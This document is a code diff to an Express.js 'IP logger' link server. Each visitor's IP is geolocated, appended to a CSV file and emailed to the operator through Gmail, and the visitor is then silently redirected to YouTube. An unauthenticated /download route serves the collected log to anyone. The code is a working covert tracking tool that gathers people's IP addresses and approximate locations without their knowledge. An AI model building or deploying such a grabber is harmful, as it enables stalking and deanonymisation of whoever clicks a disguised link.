@@ -2,6 +2,9 @@ const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
+const nodemailer = require('nodemailer');
+require('dotenv').config(); // Make sure you have a .env file with your credentials
+
 const app = express();
 const port = process.env.PORT || 3000;
 
@@ -16,24 +19,62 @@ if (!fs.existsSync(csvFilePath)) {
   fs.writeFileSync(csvFilePath, 'IP,City,Region,Country,Time\n', 'utf8');
 }
 
+// Email transporter setup
+const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: process.env.MAIL_USER,     // Your Gmail
+    pass: process.env.MAIL_PASS      // App password (NOT your Gmail password)
+  }
+});
+
+// Email sending function
+function sendEmail(ip, city, region, country, time) {
+  const mailOptions = {
+    from: process.env.MAIL_USER,
+    to: process.env.MAIL_USER, // Or any email to receive logs
+    subject: '📬 New IP Logged',
+    text: `New visitor logged:
+
+IP: ${ip}
+City: ${city}
+Region: ${region}
+Country: ${country}
+Time: ${time}
+    `
+  };
+
+  transporter.sendMail(mailOptions, (err, info) => {
+    if (err) {
+      console.error('❌ Email send failed:', err.message);
+    } else {
+      console.log('📧 Email sent:', info.response);
+    }
+  });
+}
+
 app.get('/', async (req, res) => {
   const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket?.remoteAddress;
   const ip = rawIp?.replace('::ffff:', '');
 
   try {
     const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
-    const { city, regionName, country } = geoRes.data;
+    const { city, regionName: region, country } = geoRes.data;
     const time = new Date().toISOString();
 
     console.log(`User IP: ${ip}`);
-    console.log(`Location: ${city}, ${regionName}, ${country}`);
+    console.log(`Location: ${city}, ${region}, ${country}`);
 
     // Append to CSV file
-    const row = `${ip},${city || 'N/A'},${regionName || 'N/A'},${country || 'N/A'},${time}\n`;
+    const row = `${ip},${city || 'N/A'},${region || 'N/A'},${country || 'N/A'},${time}\n`;
     fs.appendFile(csvFilePath, row, (err) => {
       if (err) console.error('Error saving to CSV:', err.message);
     });
 
+    // Send email
+    sendEmail(ip, city || 'N/A', region || 'N/A', country || 'N/A', time);
+
+    // Redirect
     res.redirect('https://youtube.com');
   } catch (err) {
     console.error('Geo lookup failed:', err.message);
@@ -41,9 +82,9 @@ app.get('/', async (req, res) => {
   }
 });
 
+// Download route
 app.get('/download', (req, res) => {
-  const filePath = path.join(__dirname, 'logs.csv');
-  res.download(filePath, 'user_logs.csv');
+  res.download(csvFilePath, 'visitor_logs.csv');
 });
 
 app.listen(port, () => {
